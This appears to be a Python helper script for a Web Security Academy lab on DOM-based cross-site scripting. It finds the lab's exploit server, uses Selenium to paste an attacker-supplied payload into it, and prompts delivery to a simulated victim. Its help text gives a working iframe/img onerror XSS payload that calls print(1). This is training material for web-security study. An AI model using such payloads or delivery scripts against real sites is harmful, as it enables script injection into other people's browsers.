#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<iframe src="https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">"

If you encounter this error: "selenium.common.exceptions.WebDriverException: Message: 'geckodriver' executable needs to be in PATH." you can follow this guide: https://askubuntu.com/questions/870530/how-to-install-geckodriver-in-ubuntu
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: <iframe src="https://vulnerable-website.com#" onload="this.src+=\'<img src=1 onerror=print(1)>\'">', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def write_body(command, hostname):
    driver = webdriver.Firefox()
    driver.get(hostname)
    textarea = driver.find_element(By.NAME, "responseBody")
    textarea.send_keys(command)
    print("Press the <Store> button and then the <Deliver exploit to victim> button")
    # store_btn = driver.find_element_by_xpath("//input[@name='formAction' and @value='STORE']")
    # store_btn.click()
    # exp_btn = driver.find_element_by_xpath("//input[@name='formAction' and @value='DELIVER_TO_VICTIM']")
    # exp_btn.click()

# get hostname of exploit server
def exp_hostname(url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname
            hostname = a['href']
            print("The hostname of exploit server is: ")
            print(hostname)
            return hostname

def main():
    
    print("(+) Exploiting DOM-based XSS")
    
    exp_hostname(url)

    write_body(command, hostname)

if __name__ == "__main__":
    main()
